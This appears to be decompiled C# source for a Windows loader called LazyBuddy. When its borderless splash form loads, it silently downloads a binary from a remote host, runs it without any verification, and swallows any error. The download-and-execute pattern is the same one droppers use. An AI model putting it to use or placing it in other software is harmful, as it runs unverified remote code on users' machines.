using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Windows.Forms;

namespace LazyBuddy_Loader
{
  public class Form1 : Form
  {
    private IContainer components = (IContainer) null;

    public Form1()
    {
      this.InitializeComponent();
    }

    private void form_load(object sender, EventArgs e)
    {
      try
      {
        byte[] bytes = new WebClient().DownloadData("https://leakod.com/auth/lazy/LazyBuddy.bin");
        string str = "LazyBuddy.bin";
        System.IO.File.WriteAllBytes(str, bytes);
        Process.Start(new ProcessStartInfo(str)
        {
          UseShellExecute = false
        });
        Application.Exit();
      }
      catch (Exception ex)
      {
        Application.Exit();
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      this.ClientSize = new Size(258, 245);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = "Form1";
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Load += new EventHandler(this.form_load);
      this.ResumeLayout(false);
    }
  }
}
